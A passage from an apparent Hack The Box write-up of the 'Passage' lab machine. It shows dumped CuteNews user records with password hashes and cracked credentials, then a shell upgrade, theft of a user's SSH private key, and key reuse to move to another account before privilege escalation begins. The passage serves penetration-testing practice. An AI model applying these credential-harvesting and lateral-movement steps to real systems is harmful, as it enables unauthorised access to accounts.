<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1598829833"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"acl"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"4"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55@test.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nick"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ=="</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lts"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1598834079"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ban"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"avatar_egre55_spwvgujw.php"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e-hide"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55@test.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"egre55"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1592483047</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592483047"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"acl"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nadav@passage.htb"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lts"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592487988"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ban"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cnt"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nadav@passage.htb"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1592483281</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid-meier"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid-meier"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592483281"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid-meier"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"acl"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid@example.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nick"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Sid Meier"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lts"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592485645"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ban"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cnt"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid@example.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sid-meier"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">1592483309</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim-swift"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim-swift"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592483309"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim-swift"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"acl"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim@example.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"nick"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Kim Swift"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lts"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1592487096"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ban"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cnt"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">;</span><span class="token argument-name">a</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim@example.com"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"kim-swift"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span></span></code></pre></li><li id="https://www.notion.so/01b351748884468698bdf1a50c647588" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We now know which hash belongs to which user, and get the following credential pairs:
</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">paul:atlanta1</code></span><span class="SemanticString">
</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">egre55:egre55</code></span></span></li><li id="https://www.notion.so/8dd99c78525146f383f1d24a8b406eff" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">su</code></span><span class="SemanticString"> as paul on the shell:</span></span><div id="https://www.notion.so/9f82417ae8334df9bc661ca945c0e8c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ su paul</code></span></span></p></div><pre id="https://www.notion.so/5e7bd3b4433b4575af81199a3ffd794e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>su: must be run from a terminal</span></span></span></code></pre></li><li id="https://www.notion.so/dec6e61ab6ec4a8393b596b5288ae01b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Spawn tty shell to run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">su</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/ff9e2e9f41854163b1dd71f8a2ddac1e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/shell.py</code></span></span></p></div></li><li id="https://www.notion.so/41dcafafc9e742aa8bc6d167ad026652" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">su</code></span><span class="SemanticString"> as paul on the pseudo terminal:</span></span><div id="https://www.notion.so/095de80302004fab9703b2223c43ca71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ su paul</code></span></span></p></div><div id="https://www.notion.so/9bc99da44e5b462f96915a1d910321ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">atlanta1</code></span></span></p></div></li><li id="https://www.notion.so/f193985dc8ba45eab30be4c1b06975c8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/7dda1c4d32a2401b9ea060e0b299c368" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/7dda1c4d32a2401b9ea060e0b299c368"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/3993c06422e741449fddeab8274e1be7" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">To make things more convenient, get Paul&#x27;s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id_rsa</code></span><span class="SemanticString"> private key from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/.ssh/</code></span><span class="SemanticString"> for a stable SSH terminal.</span></span></li><li id="https://www.notion.so/2c9e4ea8ec3841048dcfe4e91d461105" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Set the appropriate permissions:</span></span><div id="https://www.notion.so/aef60a38257c446a85c800daeb4e0bfc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ chmod 600 paul_id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/f689902c19c244d9b9f78b6919cf1f70" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">SSH in as paul:</span></span><div id="https://www.notion.so/0cf1a90f2e2d4d49b4971d04c210b9b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh paul@10.10.10.206 -i paul_id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/536a792bfefe4da69849577518d08c43" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/.ssh/authorized_keys</code></span><span class="SemanticString"> file:</span></span><div id="https://www.notion.so/c40d1688938b407d913c7450ef97077c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat authorized_keys</code></span></span></p></div><pre id="https://www.notion.so/cd4511230a3a49a1b3491a9d9b52fc40" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage</span></span></span></code></pre></li><li id="https://www.notion.so/ed2026de7c0945debcc5d456a327b121" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found nadav in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">, meaning Nadav can SSH in as Paul without a password, wonder if Paul can do that as well...</span></span></li><li id="https://www.notion.so/baccd9da3db843809d39f412a64b7a76" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Try to SSH in as nadav using Paul&#x27;s key:</span></span><div id="https://www.notion.so/c86c50954c6f4071aaad92f2a79b0a01" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh nadav@10.10.10.206 -i paul_id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/1878cb522be747099e9046ba343d80c8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">That worked, seems like Paul and Nadav are real close friends :&gt;</span></span><div id="https://www.notion.so/2d859f19508b4cbc92b67b5e6e116adf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ id</code></span></span></p></div><pre id="https://www.notion.so/741ab16d537b4f2791abd98a8d4a3f06" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span></span></span></code></pre></li><li id="https://www.notion.so/d4cbfdf637f24d10aac1c85f8eca9da2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">nadav is in the adm group, meaning we can see system logs in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/log</code></span><span class="SemanticString">. </span></span></li><li id="https://www.notion.so/2528e3f21e51493c90aa2e39ef2167ca" class="BulletedList"><span class="SemanticStringArray"><span 